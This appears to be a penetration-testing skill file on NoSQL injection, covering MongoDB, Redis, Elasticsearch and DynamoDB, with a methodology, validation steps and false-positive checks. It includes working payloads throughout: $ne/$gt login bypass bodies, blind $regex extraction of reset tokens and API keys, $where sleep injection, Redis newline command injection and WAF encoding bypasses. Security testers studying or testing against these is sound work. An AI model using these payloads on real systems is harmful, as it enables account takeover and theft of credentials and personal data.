---
name: nosql-injection
description: NoSQL injection testing covering MongoDB operator injection, authentication bypass, blind extraction, and Redis/DynamoDB/Elasticsearch-specific attack surfaces
---

# NoSQL Injection

NoSQL injection exploits the mismatch between how applications pass user input to database queries and how the database engine interprets that input. Unlike SQL injection, NoSQL injection frequently involves operator injection (e.g., MongoDB's `$gt`, `$regex`, `$where`) or structure injection (embedding JSON sub-documents). The attack surface is broad: MongoDB is the dominant target, but Redis, Elasticsearch, DynamoDB, Cassandra, and CouchDB each have distinct injection surfaces.

## Attack Surface

**MongoDB**
- Query filter objects (`find`, `findOne`, `aggregate` match stages)
- JSON body parameters coerced into query objects
- Authentication checks using `$ne`, `$regex`, `$where`, `$expr`
- Aggregation pipelines with user-controlled `$match` / `$project` / `$lookup`
- ODM/ORM wrappers (Mongoose, Morphia) using `where()` / raw filter objects

**Redis**
- Command injection via raw command construction (KEYS, EVAL, CONFIG)
- Lua script injection via EVAL
- Pub/Sub channel name injection
- Serialization-based injection (RESP protocol)

**Elasticsearch**
- Lucene query injection via `query_string`, `simple_query_string`
- JSON query DSL injection (embedded clauses, script injection)
- Script injection via `_update` with Painless scripts

**DynamoDB**
- Filter expression injection (PartiQL, FilterExpression operators)
- Attribute name/value collisions in expression maps

**CouchDB**
- JavaScript `_design` document injection via Mango query selectors
- MapReduce function injection if user controls design doc content

## High-Value Targets

- Login and authentication endpoints (username/password fields)
- Search and filter APIs (catalog, user search, admin lookup)
- Password reset and token lookup flows
- Admin queries filtering by role, plan, or privilege fields
- Endpoints accepting raw JSON objects as query parameters

## Reconnaissance

### Content-Type and Input Shape

- Identify endpoints accepting `application/json` — these can receive operator objects directly
- Identify endpoints accepting `application/x-www-form-urlencoded` — bracket notation `username[$ne]=x` maps to `{username: {$ne: 'x'}}` in many frameworks (Express `body-parser`, PHP)
- Determine whether the backend uses Mongoose, native MongoDB driver, or a REST ODM wrapper

### Error Fingerprinting

- Send malformed JSON: `{"username": {"$gt": ""}}`
- Send bracket notation in form data: `username[$gt]=`
- Look for MongoDB error messages: `MongoError`, `CastError`, `ValidationError`
- Stack traces revealing collection names, field names, driver version

### Operator Probe

Test whether operators pass through to the database:
```json
{"username": {"$gt": ""}, "password": {"$gt": ""}}
```
If authentication succeeds or response differs, operator injection is confirmed.

## Key Vulnerabilities

### MongoDB Authentication Bypass

The classic operator injection against login queries of the form `db.users.findOne({username: input.username, password: input.password})`:

**JSON body injection:**
```json
{"username": {"$ne": null}, "password": {"$ne": null}}
```
Matches the first document where both fields are non-null — typically the first user/admin.

**Form body (bracket notation):**
```
username[$ne]=invalid&password[$ne]=invalid
```

**Variations:**
```json
{"username": "admin", "password": {"$gt": ""}}
{"username": {"$regex": ".*"}, "password": {"$gt": ""}}
{"username": {"$in": ["admin", "administrator", "root"]}, "password": {"$gt": ""}}
```

### Blind Data Extraction via `$regex`

When the query result is not directly reflected but observable (boolean response, redirect, timing), extract field values character by character using `$regex`:
```json
{"username": "admin", "password": {"$regex": "^a"}}
{"username": "admin", "password": {"$regex": "^b"}}
...
```
Binary search the character space to minimize requests. Works on any string field (token, reset code, API key).

### `$where` JavaScript Injection

If `$where` operator is enabled (disabled by default in MongoDB 4.4+), inject arbitrary server-side JavaScript:
```json
{"$where": "function(){return this.username == 'admin' && sleep(2000)}"}
{"$where": "function(){return this.role == 'admin'}"}
```
`sleep()` is available in older MongoDB for timing-based blind extraction.

### Aggregation Pipeline Injection

User-controlled input flowing into `$match` or `$lookup` stages:
```json
// Input intended as a simple match value
{"filter": {"role": "user"}}

// Injected to widen scope:
{"filter": {"role": {"$ne": "nonexistent"}, "$or": [{"role": "admin"}]}}
```

### Redis Command Injection

When Redis commands are constructed by string concatenation:
```python
redis.execute_command(f"SET {user_key} {value}")
```
Inject newline characters (`\r\n`) to inject additional Redis commands (RESP protocol injection):
```
key\r\nSET backdoor attacker_controlled\r\nSET dummy
```

### Elasticsearch Query String Injection

`query_string` and `simple_query_string` accept Lucene syntax. User input flowing directly:
```
q=normal+search            →   normal results
q=*                        →   all documents
q=role:admin               →   filter by field
q=_exists_:password_hash   →   existence probe
```

For Painless script injection via `_update`:
```json
{"script": {"source": "ctx._source.role = params.r", "params": {"r": "admin"}}}
```
If the `source` field is user-controlled, inject arbitrary Painless.

### DynamoDB FilterExpression Injection

PartiQL injection allows expansion of intended queries:
```sql
-- Intended:
SELECT * FROM Users WHERE username = 'input'

-- Injected:
SELECT * FROM Users WHERE username = 'x' OR '1'='1
```

## Bypass Techniques

**Type Coercion**
- Send operators as arrays: `{"$gt": [""]}` — some drivers coerce arrays
- Mix string and object types in the same request to trigger parser branches

**Encoding**
- URL-encode brackets: `username%5B%24ne%5D=x` → `username[$ne]=x`
- Double-encode for WAFs sitting in front of JSON-parsing backends

**Operator Alternatives**
- `$nin` (not in), `$exists: false`, `$type` — alternative operators that reach the same result when `$ne` is filtered
- `$expr` with `$ne` for complex comparisons: `{"$expr": {"$ne": ["$password", "wrong"]}}`

**Whitespace/Encoding in `$regex`**
- Use case-insensitive flag: `{"$regex": "^admin$", "$options": "i"}`

## Testing Methodology

1. **Identify query-receiving endpoints** — login, search, filter, lookup
2. **Determine input format** — JSON body vs form fields vs URL params
3. **Send error-probing payloads** — malformed operator objects; watch for MongoDB/driver errors
4. **Attempt operator injection** — `$ne`, `$gt`, `$regex` against login endpoint
5. **Confirm boolean oracle** — response, status, redirect differs between true/false predicates
6. **Extract data blindly** — character-by-character `$regex` on sensitive fields (token, reset code)
7. **Test `$where`** — if older MongoDB version detected, attempt JavaScript sleep-based timing
8. **Probe aggregation endpoints** — inject operators into `filter`/`match`/`sort` fields
9. **Test non-MongoDB stores** — Elasticsearch `query_string`, Redis command construction, DynamoDB PartiQL

## Validation

1. Demonstrate authentication bypass: send operator payload, confirm login succeeds for any/first account
2. Extract a verifiable secret (password hash, reset token, API key) via `$regex` blind extraction
3. Show at least two distinct operator payloads working to rule out coincidence
4. Provide before/after: normal request returns 401, injected request returns 200
5. For `$where`: show timing differential with/without `sleep()`

## False Positives

- Framework-level query builder that casts input to string before constructing the query (Mongoose `strict` mode on)
- Input sanitization stripping operator keys before they reach the driver
- Endpoints that accept JSON but cast the `password` field to string — operator object becomes `[object Object]`
- Response differences caused by validation errors, not actual operator execution

## Impact

- Authentication bypass granting access to arbitrary or all accounts
- Full extraction of sensitive fields (tokens, hashed passwords, PII) via blind regex enumeration
- Privilege escalation by querying admin/superuser records directly
- Data exfiltration at scale via widened `$ne`/`$regex`/`$gt` filters
- Server-side JavaScript execution via `$where` on unpatched MongoDB instances

## Pro Tips

1. Always try both JSON body (`{"field": {"$ne": null}}`) and bracket-notation form (`field[$ne]=`) — different middleware handles them differently
2. Target reset token and API key fields with `$regex` extraction, not just passwords
3. Check MongoDB driver version via error messages; `$where` is available and dangerous on pre-4.4
4. In Mongoose, `{strict: false}` passes arbitrary operators to MongoDB — grep the codebase if you have access
5. For Elasticsearch, try `_cat/indices`, `_mapping`, and `_search` with `query_string: *` before attempting script injection
6. Redis injection requires newline characters (`\r\n`) in the injected value — verify URL encoding handling in the chain
7. Combine authentication bypass with a second request to `/admin` or `/api/users` to escalate impact
8. Automate `$regex` extraction with binary search: 7 requests per character vs 94 with linear search

## Summary

NoSQL injection exploits the same root cause as SQL injection — user input controlling query structure — but through operator embedding rather than syntax breaking. MongoDB is the primary target; enforce schema validation, use parameterized equivalents (strict mode, typed schemas), and never pass raw user input as a query object.
